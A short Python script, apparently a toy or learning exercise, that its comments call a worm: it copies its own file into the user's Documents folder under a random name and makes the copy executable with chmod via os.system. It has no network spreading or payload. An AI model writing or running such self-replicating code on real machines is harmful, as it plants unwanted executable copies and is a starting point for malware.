#!/usr/bin/env python3

import os
from shutil import copyfile
import getpass
import random


def replicate():

	#get the name of the current iteration of the worm
	filename = os.path.basename(__file__)

	#find the current location of the worm file
	location = os.path.abspath(filename)

	#get the username of Linux user to know the home folder location
	user = getpass.getuser()

	#generate random string to differentiate files while testing
	noise = str(random.random())

	#set destination to the user's Documents folder
	destination = "/home/"+user+"/Documents/"+"wormreplicate"+noise+".py"

	#Copies our file into the new location
	copyfile(location,destination)
	
	print(f"The worm has been copied to {destination}.")
	return destination

def make_executable(destination):

	#sets the target for permission changes to be the newly created file
	target = destination

	#sets a command to make a file executable	
	cmd = "chmod +x" + " " + destination

	#run the command
	os.system(cmd)

def main():
	destination = replicate()
	make_executable(destination)


if __name__ == "__main__":
	main()
